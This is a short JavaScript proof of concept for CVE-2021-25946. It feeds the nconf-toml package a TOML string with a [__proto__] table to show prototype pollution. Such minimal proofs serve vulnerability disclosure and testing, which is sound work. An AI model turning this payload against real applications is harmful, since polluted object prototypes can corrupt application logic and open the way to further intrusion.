//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25946
const nt = require("nconf-toml");
const payload = '[__proto__]\npolluted = "yes"';
nt.parse(payload);
